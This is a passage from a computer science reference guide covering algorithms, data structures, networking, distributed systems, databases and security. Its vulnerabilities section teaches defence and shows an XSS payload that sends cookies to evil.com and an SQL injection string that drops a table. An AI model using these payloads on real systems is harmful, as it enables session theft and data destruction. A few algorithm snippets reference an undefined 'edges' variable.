        quicksort(arr, lo, pivot - 1)
        quicksort(arr, pivot + 1, hi)

def partition(arr, lo, hi):
    pivot = arr[hi]
    i = lo - 1
    for j in range(lo, hi):
        if arr[j] <= pivot:
            i += 1
            arr[i], arr[j] = arr[j], arr[i]
    arr[i + 1], arr[hi] = arr[hi], arr[i + 1]
    return i + 1
```

**Merge Sort**:
```python
def mergesort(arr):
    if len(arr) <= 1:
        return arr
    mid = len(arr) // 2
    left = mergesort(arr[:mid])
    right = mergesort(arr[mid:])
    return merge(left, right)

def merge(left, right):
    result = []
    i = j = 0
    while i < len(left) and j < len(right):
        if left[i] <= right[j]:
            result.append(left[i])
            i += 1
        else:
            result.append(right[j])
            j += 1
    result.extend(left[i:])
    result.extend(right[j:])
    return result
```

## 7.3 Searching Algorithms

### Array Search
```python
# Linear Search - O(n)
def linear_search(arr, target):
    for i, x in enumerate(arr):
        if x == target:
            return i
    return -1

# Binary Search - O(log n), requires sorted array
def binary_search(arr, target):
    lo, hi = 0, len(arr) - 1
    while lo <= hi:
        mid = (lo + hi) // 2
        if arr[mid] == target:
            return mid
        elif arr[mid] < target:
            lo = mid + 1
        else:
            hi = mid - 1
    return -1
```

### Graph Search
```python
# Breadth-First Search (BFS)
def bfs(graph, start):
    visited = set()
    queue = deque([start])
    while queue:
        node = queue.popleft()
        if node not in visited:
            visited.add(node)
            queue.extend(graph[node] - visited)
    return visited

# Depth-First Search (DFS)
def dfs(graph, start, visited=None):
    if visited is None:
        visited = set()
    visited.add(start)
    for neighbor in graph[start] - visited:
        dfs(graph, neighbor, visited)
    return visited
```

## 7.4 Graph Algorithms

### Shortest Path

**Dijkstra's Algorithm** (non-negative weights):
```python
def dijkstra(graph, start):
    distances = {node: float('inf') for node in graph}
    distances[start] = 0
    pq = [(0, start)]

    while pq:
        dist, node = heapq.heappop(pq)
        if dist > distances[node]:
            continue
        for neighbor, weight in graph[node]:
            new_dist = dist + weight
            if new_dist < distances[neighbor]:
                distances[neighbor] = new_dist
                heapq.heappush(pq, (new_dist, neighbor))
    return distances
# O((V + E) log V) with binary heap
```

**Bellman-Ford** (handles negative weights):
```python
def bellman_ford(graph, start, n):
    distances = {i: float('inf') for i in range(n)}
    distances[start] = 0

    for _ in range(n - 1):
        for u, v, w in edges:
            if distances[u] + w < distances[v]:
                distances[v] = distances[u] + w

    # Check for negative cycle
    for u, v, w in edges:
        if distances[u] + w < distances[v]:
            raise ValueError("Negative cycle detected")
    return distances
# O(VE)
```

**Floyd-Warshall** (all pairs):
```python
def floyd_warshall(graph, n):
    dist = [[float('inf')] * n for _ in range(n)]
    for i in range(n):
        dist[i][i] = 0
    for u, v, w in edges:
        dist[u][v] = w

    for k in range(n):
        for i in range(n):
            for j in range(n):
                dist[i][j] = min(dist[i][j], dist[i][k] + dist[k][j])
    return dist
# O(V³)
```

### Minimum Spanning Tree

**Kruskal's Algorithm**:
```python
def kruskal(edges, n):
    parent = list(range(n))

    def find(x):
        if parent[x] != x:
            parent[x] = find(parent[x])
        return parent[x]

    def union(x, y):
        parent[find(x)] = find(y)

    edges.sort(key=lambda e: e[2])  # Sort by weight
    mst = []
    for u, v, w in edges:
        if find(u) != find(v):
            union(u, v)
            mst.append((u, v, w))
    return mst
# O(E log E)
```

**Prim's Algorithm**:
```python
def prim(graph, n):
    visited = [False] * n
    pq = [(0, 0)]  # (weight, node)
    mst_weight = 0

    while pq:
        weight, node = heapq.heappop(pq)
        if visited[node]:
            continue
        visited[node] = True
        mst_weight += weight
        for neighbor, w in graph[node]:
            if not visited[neighbor]:
                heapq.heappush(pq, (w, neighbor))
    return mst_weight
# O((V + E) log V)
```

### Topological Sort
```python
def topological_sort(graph, n):
    in_degree = [0] * n
    for node in graph:
        for neighbor in graph[node]:
            in_degree[neighbor] += 1

    queue = deque([i for i in range(n) if in_degree[i] == 0])
    result = []

    while queue:
        node = queue.popleft()
        result.append(node)
        for neighbor in graph[node]:
            in_degree[neighbor] -= 1
            if in_degree[neighbor] == 0:
                queue.append(neighbor)

    if len(result) != n:
        raise ValueError("Cycle detected")
    return result
# O(V + E)
```

## 7.5 Dynamic Programming

### Pattern
```
1. Define subproblems
2. Write recurrence relation
3. Find dependencies
4. Compute bottom-up (or top-down with memoization)
```

### Classic Problems

**Fibonacci**:
```python
# Top-down with memoization
@lru_cache(None)
def fib(n):
    if n <= 1:
        return n
    return fib(n-1) + fib(n-2)

# Bottom-up
def fib(n):
    if n <= 1:
        return n
    dp = [0, 1]
    for i in range(2, n+1):
        dp.append(dp[-1] + dp[-2])
    return dp[n]
```

**Longest Common Subsequence**:
```python
def lcs(s1, s2):
    m, n = len(s1), len(s2)
    dp = [[0] * (n+1) for _ in range(m+1)]

    for i in range(1, m+1):
        for j in range(1, n+1):
            if s1[i-1] == s2[j-1]:
                dp[i][j] = dp[i-1][j-1] + 1
            else:
                dp[i][j] = max(dp[i-1][j], dp[i][j-1])
    return dp[m][n]
# O(mn)
```

**0/1 Knapsack**:
```python
def knapsack(weights, values, capacity):
    n = len(weights)
    dp = [[0] * (capacity+1) for _ in range(n+1)]

    for i in range(1, n+1):
        for w in range(capacity+1):
            if weights[i-1] <= w:
                dp[i][w] = max(
                    dp[i-1][w],
                    dp[i-1][w-weights[i-1]] + values[i-1]
                )
            else:
                dp[i][w] = dp[i-1][w]
    return dp[n][capacity]
# O(n * capacity)
```

**Edit Distance**:
```python
def edit_distance(s1, s2):
    m, n = len(s1), len(s2)
    dp = [[0] * (n+1) for _ in range(m+1)]

    for i in range(m+1):
        dp[i][0] = i
    for j in range(n+1):
        dp[0][j] = j

    for i in range(1, m+1):
        for j in range(1, n+1):
            if s1[i-1] == s2[j-1]:
                dp[i][j] = dp[i-1][j-1]
            else:
                dp[i][j] = 1 + min(
                    dp[i-1][j],    # Delete
                    dp[i][j-1],    # Insert
                    dp[i-1][j-1]   # Replace
                )
    return dp[m][n]
# O(mn)
```

---

# 8. DATA STRUCTURES

## 8.1 Arrays & Lists

### Array
```
Fixed size, contiguous memory
Access: O(1)
Insert/Delete: O(n)
Search: O(n), O(log n) if sorted

Usage: When size known, random access needed
```

### Dynamic Array (ArrayList, Vector)
```
Resizable array
Amortized O(1) append
Double size when full

Python: list
Java: ArrayList
C++: std::vector
```

### Linked List
```
Nodes with data + next pointer
Insert/Delete: O(1) at known position
Access: O(n)
No random access

Types:
- Singly linked
- Doubly linked
- Circular
```

## 8.2 Stacks & Queues

### Stack (LIFO)
```
Operations:
- push(x): Add to top - O(1)
- pop(): Remove from top - O(1)
- peek(): View top - O(1)

Applications:
- Function call stack
- Expression evaluation
- Undo functionality
- DFS
```

### Queue (FIFO)
```
Operations:
- enqueue(x): Add to back - O(1)
- dequeue(): Remove from front - O(1)
- peek(): View front - O(1)

Applications:
- BFS
- Task scheduling
- Buffers
```

### Deque (Double-ended Queue)
```
Insert/remove from both ends: O(1)
Python: collections.deque
C++: std::deque
```

### Priority Queue
```
Always extract min (or max)
Operations:
- insert(x): O(log n)
- extract_min(): O(log n)
- peek_min(): O(1)

Implementation: Binary heap
Applications: Dijkstra, scheduling
```

## 8.3 Trees

### Binary Tree
```
        1
       / \
      2   3
     / \   \
    4   5   6

Properties:
- Max nodes at level i: 2^i
- Max nodes in tree of height h: 2^(h+1) - 1
```

### Binary Search Tree (BST)
```
Property: left < root < right

Operations (average case):
- Search: O(log n)
- Insert: O(log n)
- Delete: O(log n)

Worst case (unbalanced): O(n)
```

### Balanced Trees

**AVL Tree**:
```
Balance factor = height(left) - height(right)
Must be -1, 0, or 1
Rotations maintain balance
Strictly balanced
```

**Red-Black Tree**:
```
Properties:
1. Every node is red or black
2. Root is black
3. Leaves (NIL) are black
4. Red node has black children
5. All paths have same black count

Used by: Java TreeMap, C++ std::map
```

**B-Tree**:
```
For disk-based storage
Multiple keys per node
High branching factor
Height minimized
Used by: Databases, file systems
```

### Heap
```
Complete binary tree
Min-heap: parent ≤ children
Max-heap: parent ≥ children

Array representation:
- Parent of i: (i-1)/2
- Left child: 2i + 1
- Right child: 2i + 2

Operations:
- Insert: O(log n) - add at end, bubble up
- Extract: O(log n) - replace root with last, bubble down
- Build heap: O(n)
```

### Trie (Prefix Tree)
```
        root
       /    \
      a      b
     / \      \
    p   n      e
   /     \      \
  p       d     ar
 /
le

Usage: Autocomplete, spell check, IP routing
Operations: O(m) where m = key length
```

## 8.4 Hash Tables

### Hash Function
```
Desired properties:
- Deterministic
- Uniform distribution
- Fast to compute

Common functions:
- Division: h(k) = k mod m
- Multiplication: h(k) = floor(m * (k*A mod 1))
- Universal hashing: Random from family
```

### Collision Resolution

**Chaining**:
```
Each bucket is a linked list
Simple, works well with high load factor
Extra memory for pointers
```

**Open Addressing**:
```
Linear probing:   h(k, i) = (h(k) + i) mod m
Quadratic probing: h(k, i) = (h(k) + c₁i + c₂i²) mod m
Double hashing:   h(k, i) = (h₁(k) + i*h₂(k)) mod m

Clustering can degrade performance
```

### Performance
```
Average case: O(1) for insert, search, delete
Worst case: O(n) (all collisions)
Load factor α = n/m affects performance
Resize when α exceeds threshold
```

## 8.5 Graphs

### Representations

**Adjacency Matrix**:
```
Space: O(V²)
Edge lookup: O(1)
Best for: Dense graphs

    0  1  2  3
0 [ 0  1  1  0 ]
1 [ 1  0  1  1 ]
2 [ 1  1  0  0 ]
3 [ 0  1  0  0 ]
```

**Adjacency List**:
```
Space: O(V + E)
Edge iteration: O(degree)
Best for: Sparse graphs

0: [1, 2]
1: [0, 2, 3]
2: [0, 1]
3: [1]
```

### Graph Types
```
Directed vs Undirected
Weighted vs Unweighted
Cyclic vs Acyclic
Connected vs Disconnected
Complete: All possible edges
Bipartite: Two sets, edges between sets only
```

## 8.6 Advanced Data Structures

### Segment Tree
```
Range queries and updates: O(log n)
Build: O(n)

Applications:
- Range sum/min/max queries
- Range updates
```

### Fenwick Tree (Binary Indexed Tree)
```
Prefix sum queries: O(log n)
Point updates: O(log n)
Space: O(n)
Simpler than segment tree
```

### Disjoint Set (Union-Find)
```python
class UnionFind:
    def __init__(self, n):
        self.parent = list(range(n))
        self.rank = [0] * n

    def find(self, x):
        if self.parent[x] != x:
            self.parent[x] = self.find(self.parent[x])  # Path compression
        return self.parent[x]

    def union(self, x, y):
        px, py = self.find(x), self.find(y)
        if px == py:
            return
        if self.rank[px] < self.rank[py]:  # Union by rank
            px, py = py, px
        self.parent[py] = px
        if self.rank[px] == self.rank[py]:
            self.rank[px] += 1

# Nearly O(1) amortized (inverse Ackermann)
```

### Bloom Filter
```
Space-efficient probabilistic set membership
False positives possible, no false negatives

Operations:
- Insert: Hash k times, set k bits
- Query: Check if all k bits set

Parameters:
- m: Bit array size
- k: Number of hash functions
- n: Expected elements
- p: False positive rate ≈ (1 - e^(-kn/m))^k
```

### Skip List
```
Probabilistic alternative to balanced trees
Multiple levels of linked lists
Expected O(log n) search, insert, delete

Level 3: 1 ─────────────────────> 9
Level 2: 1 ────────> 4 ─────────> 9
Level 1: 1 ───> 3 ─> 4 ───> 7 ─> 9
Level 0: 1 > 2 > 3 > 4 > 5 > 7 > 9
```

---

# 9. NETWORKING

## 9.1 OSI Model

```
Layer 7: Application   - HTTP, FTP, DNS, SMTP
Layer 6: Presentation  - SSL/TLS, JPEG, ASCII
Layer 5: Session       - NetBIOS, RPC
Layer 4: Transport     - TCP, UDP
Layer 3: Network       - IP, ICMP, OSPF
Layer 2: Data Link     - Ethernet, WiFi, PPP
Layer 1: Physical      - Cables, radio waves

Mnemonic: "All People Seem To Need Data Processing"
```

## 9.2 TCP/IP Model

```
Application Layer  ─────── HTTP, DNS, FTP
Transport Layer    ─────── TCP, UDP
Internet Layer     ─────── IP, ICMP
Network Access     ─────── Ethernet, WiFi
```

## 9.3 IP Addressing

### IPv4
```
32 bits: 192.168.1.1
Dotted decimal notation
~4.3 billion addresses

Classes (historical):
A: 1.0.0.0 - 126.255.255.255 (/8)
B: 128.0.0.0 - 191.255.255.255 (/16)
C: 192.0.0.0 - 223.255.255.255 (/24)

Private ranges:
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
```

### CIDR Notation
```
192.168.1.0/24
/24 = 256 addresses (254 usable)
Subnet mask: 255.255.255.0

Network:   192.168.1.0
Broadcast: 192.168.1.255
Usable:    192.168.1.1 - 192.168.1.254
```

### IPv6
```
128 bits: 2001:0db8:85a3:0000:0000:8a2e:0370:7334
Shortened: 2001:db8:85a3::8a2e:370:7334
~340 undecillion addresses
```

## 9.4 TCP (Transmission Control Protocol)

### Properties
- Connection-oriented
- Reliable delivery
- Ordered delivery
- Flow control
- Congestion control

### Three-Way Handshake
```
Client                    Server
   │                         │
   │───── SYN (seq=x) ──────>│
   │                         │
   │<─── SYN-ACK (ack=x+1) ──│
   │       (seq=y)           │
   │                         │
   │───── ACK (ack=y+1) ────>│
   │                         │
   │     Connection open     │
```

### TCP Header
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
├─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┤
│          Source Port          │       Destination Port        │
├─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┤
│                        Sequence Number                        │
├─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┤
│                    Acknowledgment Number                      │
├─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┤
│Offset│  Reserved │Flags│          Window Size                 │
├─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┤
│           Checksum            │         Urgent Pointer        │
└─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┘

Flags: URG, ACK, PSH, RST, SYN, FIN
```

### Congestion Control
```
Slow Start:
- Start with cwnd = 1 MSS
- Double cwnd each RTT
- Until ssthresh reached

Congestion Avoidance:
- Increase cwnd by 1 MSS per RTT
- Linear increase

Fast Retransmit:
- 3 duplicate ACKs → retransmit
- Don't wait for timeout

Fast Recovery:
- After fast retransmit
- cwnd = ssthresh + 3
- Linear increase
```

## 9.5 UDP (User Datagram Protocol)

### Properties
- Connectionless
- Unreliable
- No ordering
- No flow control
- Low overhead

### UDP Header
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
├─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┤
│          Source Port          │       Destination Port        │
├─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┤
│            Length             │           Checksum            │
└─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┘

Only 8 bytes overhead (vs 20+ for TCP)
```

### Use Cases
- DNS queries
- Video streaming
- Online gaming
- VoIP
- DHCP

## 9.6 Application Protocols

### HTTP (HyperText Transfer Protocol)
```
Request:
GET /path HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0

Response:
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1234

<html>...</html>

Methods: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS

Status Codes:
1xx: Informational
2xx: Success (200 OK, 201 Created)
3xx: Redirect (301 Moved, 304 Not Modified)
4xx: Client Error (400 Bad Request, 404 Not Found)
5xx: Server Error (500 Internal Error, 503 Unavailable)
```

### DNS (Domain Name System)
```
Hierarchical distributed database
Domain: www.example.com.
                    └── Root
                   └── .com (TLD)
                  └── example (SLD)
                 └── www (subdomain)

Record Types:
A:     IPv4 address
AAAA:  IPv6 address
CNAME: Canonical name (alias)
MX:    Mail exchange
NS:    Name server
TXT:   Text record
SOA:   Start of authority
PTR:   Reverse lookup
```

### TLS (Transport Layer Security)
```
TLS Handshake:
1. ClientHello (supported versions, ciphers)
2. ServerHello (chosen version, cipher)
3. Certificate (server's cert)
4. Key Exchange
5. Finished (both sides)

Provides:
- Confidentiality (encryption)
- Integrity (MAC)
- Authentication (certificates)
```

## 9.7 Network Devices

```
Hub:     Layer 1 - Broadcasts to all ports
Switch:  Layer 2 - MAC address table
Router:  Layer 3 - IP routing
Firewall: Layer 4-7 - Packet filtering
Load Balancer: Layer 4-7 - Distribute traffic
```

---

# 10. DISTRIBUTED SYSTEMS

## 10.1 Fundamentals

### CAP Theorem
```
Pick 2 of 3:
- Consistency: All nodes see same data
- Availability: Every request gets response
- Partition Tolerance: System works despite network failures

In practice: P is required, choose C or A

CP: Consistent during partition (MongoDB, HBase)
AP: Available during partition (Cassandra, DynamoDB)
```

### ACID vs BASE

**ACID** (Traditional databases):
```
Atomicity:    All or nothing
Consistency:  Valid state to valid state
Isolation:    Concurrent = serial
Durability:   Committed = permanent
```

**BASE** (NoSQL):
```
Basically Available: Usually works
Soft state:         State may change over time
Eventually consistent: Given time, converges
```

### Consistency Models
```
Strong Consistency:
  Read returns most recent write

Sequential Consistency:
  All processes see same order of operations

Causal Consistency:
  Causally related operations seen in order

Eventual Consistency:
  Given enough time, all replicas converge
```

## 10.2 Consensus Algorithms

### Paxos
```
Roles: Proposers, Acceptors, Learners

Phase 1 (Prepare):
1. Proposer sends prepare(n) to acceptors
2. Acceptor promises not to accept < n

Phase 2 (Accept):
1. Proposer sends accept(n, v) to acceptors
2. Acceptor accepts if promised n
3. Majority accepts → value chosen
```

### Raft
```
Easier to understand than Paxos

Leader Election:
- Terms numbered
- One leader per term
- Heartbeats maintain leadership
- Timeout → new election

Log Replication:
- Leader receives client requests
- Leader appends to log
- Leader replicates to followers
- Committed when majority acknowledge
```

### Byzantine Fault Tolerance (BFT)
```
Handles malicious nodes
Requires 3f + 1 nodes to tolerate f Byzantine faults
PBFT: Practical BFT algorithm
Used in: Blockchain, critical systems
```

## 10.3 Distributed Data

### Replication
```
Single Leader:
- One primary, multiple replicas
- Writes to primary only
- Simple, but primary is bottleneck

Multi-Leader:
- Multiple primaries
- Conflict resolution needed
- Higher availability

Leaderless:
- Any node accepts writes
- Quorum: R + W > N
- Example: Dynamo
```

### Partitioning (Sharding)
```
Hash Partitioning:
  hash(key) mod N → partition
  Even distribution
  Range queries difficult

Range Partitioning:
  Key ranges → partitions
  Good for range queries
  Risk of hot spots

Consistent Hashing:
  Hash ring, virtual nodes
  Minimal reshuffling on changes
  Used by: Cassandra, DynamoDB
```

### Vector Clocks
```
Track causality in distributed systems
Each node maintains counter vector

Node A: [A:1, B:0, C:0]
Node B: [A:1, B:1, C:0]
Node C: [A:0, B:0, C:1]

Concurrent: Neither dominates the other
Causal: One dominates (all >= and one >)
```

## 10.4 Message Queues

### Patterns
```
Point-to-Point:
  One producer, one consumer
  Message consumed once

Publish-Subscribe:
  Publishers → Topics → Subscribers
  Message delivered to all subscribers

Request-Reply:
  Synchronous communication
  Correlation IDs match requests/replies
```

### Message Semantics
```
At-most-once:
  Fire and forget
  May lose messages

At-least-once:
  Retry until acknowledged
  May duplicate messages

Exactly-once:
  Idempotent operations
  Deduplication
  Most complex
```

### Technologies
```
RabbitMQ:   AMQP protocol, flexible routing
Apache Kafka: Log-based, high throughput
Redis Pub/Sub: In-memory, fast
Apache Pulsar: Multi-tenancy, tiered storage
Amazon SQS/SNS: Cloud managed
```

## 10.5 Microservices

### Characteristics
- Single responsibility
- Independently deployable
- Decentralized data management
- Smart endpoints, dumb pipes
- Design for failure

### Communication
```
Synchronous:
- REST
- gRPC
- GraphQL

Asynchronous:
- Message queues
- Event streaming
```

### Service Discovery
```
Client-side:
  Client queries registry
  Client load balances
  Example: Netflix Eureka

Server-side:
  Load balancer queries registry
  Client talks to load balancer
  Example: Kubernetes Service
```

### Circuit Breaker
```
States: Closed → Open → Half-Open

Closed: Normal operation
Open: After failures, fail fast
Half-Open: Test if service recovered

Prevents cascade failures
Libraries: Hystrix, Resilience4j
```

---

# 11. DATABASES

## 11.1 Relational Databases

### SQL Fundamentals
```sql
-- Create
CREATE TABLE users (
    id INT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    email VARCHAR(255) UNIQUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Insert
INSERT INTO users (id, name, email)
VALUES (1, 'Alice', 'alice@example.com');

-- Query
SELECT u.name, COUNT(o.id) as order_count
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
WHERE u.created_at > '2024-01-01'
GROUP BY u.id
HAVING order_count > 5
ORDER BY order_count DESC
LIMIT 10;

-- Update
UPDATE users SET name = 'Bob' WHERE id = 1;

-- Delete
DELETE FROM users WHERE id = 1;
```

### Joins
```
INNER JOIN: Only matching rows
LEFT JOIN:  All left + matching right
RIGHT JOIN: All right + matching left
FULL JOIN:  All rows from both
CROSS JOIN: Cartesian product
```

### Indexing
```sql
-- B-Tree index (default)
CREATE INDEX idx_users_email ON users(email);

-- Composite index
CREATE INDEX idx_orders_user_date ON orders(user_id, order_date);

-- Unique index
CREATE UNIQUE INDEX idx_users_email ON users(email);

-- Full-text index
CREATE FULLTEXT INDEX idx_posts_content ON posts(content);
```

### Normalization
```
1NF: Atomic values, no repeating groups
2NF: 1NF + no partial dependencies
3NF: 2NF + no transitive dependencies
BCNF: 3NF + every determinant is candidate key

Denormalization: Intentionally break normalization for performance
```

### Transactions
```sql
BEGIN TRANSACTION;

UPDATE accounts SET balance = balance - 100 WHERE id = 1;
UPDATE accounts SET balance = balance + 100 WHERE id = 2;

COMMIT;  -- or ROLLBACK;

Isolation Levels:
- Read Uncommitted: Dirty reads possible
- Read Committed:   No dirty reads
- Repeatable Read:  No non-repeatable reads
- Serializable:     Full isolation (slowest)
```

## 11.2 NoSQL Databases

### Document Stores
```
MongoDB:
{
  "_id": ObjectId("..."),
  "name": "Alice",
  "orders": [
    {"item": "book", "price": 10},
    {"item": "pen", "price": 2}
  ]
}

Flexible schema
Good for: Content management, catalogs
```

### Key-Value Stores
```
Redis:
SET user:1 "Alice"
GET user:1
HSET user:1 name "Alice" email "alice@example.com"

Fast, simple
Good for: Caching, sessions, leaderboards
```

### Column-Family Stores
```
Cassandra:
Row key → Column families → Columns

CREATE TABLE users (
    user_id UUID PRIMARY KEY,
    name TEXT,
    email TEXT
);

Good for: Time series, write-heavy workloads
```

### Graph Databases
```
Neo4j (Cypher):
CREATE (alice:Person {name: 'Alice'})
CREATE (bob:Person {name: 'Bob'})
CREATE (alice)-[:FRIENDS_WITH]->(bob)

MATCH (p:Person)-[:FRIENDS_WITH]->(friend)
WHERE p.name = 'Alice'
RETURN friend.name

Good for: Social networks, recommendations
```

## 11.3 Query Processing

### Query Execution
```
1. Parse: SQL → AST
2. Validate: Check syntax, permissions
3. Optimize: Choose execution plan
4. Execute: Run plan
5. Return: Send results

EXPLAIN SELECT * FROM users WHERE id = 1;
Shows execution plan
```

### Query Optimization
```
Cost-based optimization:
- Estimate cardinality
- Calculate I/O cost
- Choose lowest cost plan

Techniques:
- Predicate pushdown
- Join reordering
- Index selection
- Materialized views
```

### Storage Engines
```
InnoDB (MySQL):
- ACID compliant
- Row-level locking
- Foreign keys

MyISAM (MySQL):
- Table-level locking
- Full-text search
- No transactions

LSM Trees (RocksDB, Cassandra):
- Write-optimized
- Compaction
- Good for write-heavy workloads
```

## 11.4 Scaling Databases

### Vertical Scaling
```
More powerful hardware
- More RAM
- Faster CPU
- Faster storage (SSD)

Limits: Hardware ceiling, single point of failure
```

### Horizontal Scaling
```
Add more machines

Read Replicas:
- Master handles writes
- Replicas handle reads
- Replication lag

Sharding:
- Partition data across nodes
- Each shard is independent
- Challenges: Cross-shard queries, rebalancing
```

### Connection Pooling
```
Reuse database connections
Avoid connection overhead
Tools: PgBouncer, ProxySQL
```

---

# 12. SECURITY & CRYPTOGRAPHY

## 12.1 Cryptographic Primitives

### Symmetric Encryption
```
Same key for encrypt and decrypt

AES (Advanced Encryption Standard):
- Block cipher: 128-bit blocks
- Key sizes: 128, 192, 256 bits
- Modes: ECB, CBC, CTR, GCM

ChaCha20:
- Stream cipher
- Fast in software
- Used in TLS
```

### Asymmetric Encryption
```
Public key (encrypt) / Private key (decrypt)

RSA:
- Based on factoring difficulty
- Key sizes: 2048, 4096 bits
- Used for: Key exchange, signatures

ECC (Elliptic Curve):
- Smaller keys, same security
- 256-bit ECC ≈ 3072-bit RSA
- Examples: ECDSA, ECDH, Ed25519
```

### Hash Functions
```
One-way, fixed-size output

SHA-256:
- 256-bit output
- Collision resistant
- Used everywhere

SHA-3 (Keccak):
- Different construction
- NIST standard 2015

bcrypt, Argon2:
- Password hashing
- Intentionally slow
- Salt built-in
```

### Message Authentication Code (MAC)
```
HMAC:
- Hash-based MAC
- HMAC-SHA256 common
- Verify integrity + authenticity

Authenticated Encryption:
- AES-GCM
- ChaCha20-Poly1305
- Encrypt + MAC in one operation
```

## 12.2 Public Key Infrastructure (PKI)

### X.509 Certificates
```
Certificate contains:
- Subject (who)
- Public key
- Issuer (CA)
- Validity period
- Signature

Certificate chain:
End Entity → Intermediate CA → Root CA
```

### Certificate Authorities
```
Trust hierarchy
Root CAs in browsers/OS
Intermediate CAs sign end certificates

Certificate Transparency:
- Public logs of all certificates
- Detect mis-issuance
```

## 12.3 Common Vulnerabilities

### OWASP Top 10 (2021)
```
1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQL, XSS, etc.)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Auth Failures
8. Integrity Failures
9. Logging Failures
10. Server-Side Request Forgery
```

### SQL Injection
```
Vulnerable:
query = "SELECT * FROM users WHERE id = " + user_input

Attack:
user_input = "1; DROP TABLE users;"

Prevention:
- Parameterized queries
- Prepared statements
- Input validation
```

### XSS (Cross-Site Scripting)
```
Reflected: Input echoed in response
Stored: Script saved in database
DOM-based: Client-side JavaScript

Attack:
<script>document.location='http://evil.com/steal?c='+document.cookie</script>

Prevention:
- Output encoding
- Content Security Policy
- HttpOnly cookies
```

### CSRF (Cross-Site Request Forgery)
```
Attack: Trick user into making unwanted request
While user is authenticated

Prevention:
- CSRF tokens
- SameSite cookies
- Check Referer header
```

## 12.4 Authentication & Authorization

### Authentication Methods
```
Password:
- Hash with salt (bcrypt, Argon2)
- Enforce complexity
- Rate limiting

Multi-Factor (MFA):
- Something you know (password)
- Something you have (phone, token)
- Something you are (biometric)

OAuth 2.0 / OpenID Connect:
- Authorization framework
- Token-based
- Third-party authentication
```

### JWT (JSON Web Token)
```
Header.Payload.Signature

{
  "alg": "HS256",
  "typ": "JWT"
}
.
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}
.
[signature]

Stateless authentication
Verify signature to validate
```

### Authorization
```
RBAC (Role-Based Access Control):
- Users have roles
- Roles have permissions
- Simple, common

ABAC (Attribute-Based Access Control):
- Policies based on attributes
- User attributes, resource attributes
- Flexible, complex

ACL (Access Control List):
- Per-resource permissions
- User/group → permissions
```

---

# 13. ARTIFICIAL INTELLIGENCE

## 13.1 AI Fundamentals

### What is AI?
```
Systems that exhibit intelligent behavior:
- Learning from experience
- Understanding language
- Recognizing patterns
- Making decisions
- Solving problems

Narrow AI: Specific tasks (current state)
General AI: Human-level intelligence (theoretical)
Super AI: Beyond human intelligence (hypothetical)
```

### AI Approaches
```
Symbolic AI:
- Knowledge representation
- Rules and logic
- Expert systems
- Pros: Explainable, domain knowledge
- Cons: Brittle, hard to scale

Statistical AI:
- Pattern recognition
- Probability and statistics
- Machine learning
- Pros: Learns from data, scalable
- Cons: Black box, needs data

Hybrid:
- Combine symbolic and statistical
- Neural-symbolic AI
- Knowledge-enhanced learning
```

## 13.2 Search Algorithms

### Uninformed Search
```
Breadth-First Search (BFS):
- Complete: Yes (if finite)
- Optimal: Yes (if uniform cost)
- Time: O(b^d)
- Space: O(b^d)

Depth-First Search (DFS):
- Complete: No (infinite paths)
- Optimal: No
- Time: O(b^m)
- Space: O(bm)

Iterative Deepening:
- Combines BFS and DFS benefits
- Complete and optimal
- Space efficient
```

### Informed Search
```
A* Algorithm:
f(n) = g(n) + h(n)
- g(n): Cost from start to n
- h(n): Heuristic estimate to goal

Admissible heuristic: h(n) ≤ actual cost
Consistent heuristic: h(n) ≤ c(n,n') + h(n')

A* is optimal with admissible heuristic
```

### Adversarial Search
```
Minimax:
- Two-player zero-sum games
- Maximize own utility
- Assume opponent minimizes

Alpha-Beta Pruning:
- Prune branches that can't affect decision
- Same result as minimax
- Much faster in practice
```

## 13.3 Knowledge Representation

### Logic
```
Propositional Logic:
- Propositions: true/false
- Connectives: ∧, ∨, ¬, →, ↔
- Limited expressiveness

First-Order Logic:
- Objects, predicates, quantifiers
- ∀x: Human(x) → Mortal(x)
- More expressive
```

### Ontologies
```
Knowledge structure:
- Classes (concepts)
- Properties (relationships)
- Individuals (instances)

OWL (Web Ontology Language):
- Semantic web standard
- Reasoning capabilities
```

### Knowledge Graphs
